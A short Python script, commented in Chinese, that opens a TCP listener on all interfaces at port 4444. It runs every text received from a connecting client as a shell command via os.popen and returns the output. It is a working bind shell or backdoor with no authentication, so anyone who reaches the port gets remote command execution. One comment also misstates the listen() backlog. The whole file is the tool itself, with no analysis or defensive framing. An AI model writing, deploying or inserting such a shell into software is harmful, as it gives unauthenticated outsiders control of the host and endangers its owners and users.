import socket
import os

ip = "0.0.0.0"
port = 4444

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #使用TCP协议
s.bind((ip, port))  #绑定地址

s.listen(5)  #开启监听，最多接受1个连接
print(f"Listen on port {port}")

dataSocket, remoteAddr = s.accept()  #dataSocket是新的套接字对象，可以用来接收和发送数据；remoteAddr是连接者的IP地址
print(f"{remoteAddr} connected ")

while True:
    recved = dataSocket.recv(1024)
    
    if not recved:          #如果recved为空，表示对方关闭了连接，所以直接break
        break

    info = recved.decode()  #数据流是bytes类型的话，需要进行解码
    print(info)
    if info.rstrip() == "exit":
        break
    else:
        output=os.popen(info).read()
        dataSocket.send(f">>> {output}".encode())       #发送的数据必须是bytes类型，所以要编码

dataSocket.close()
s.close()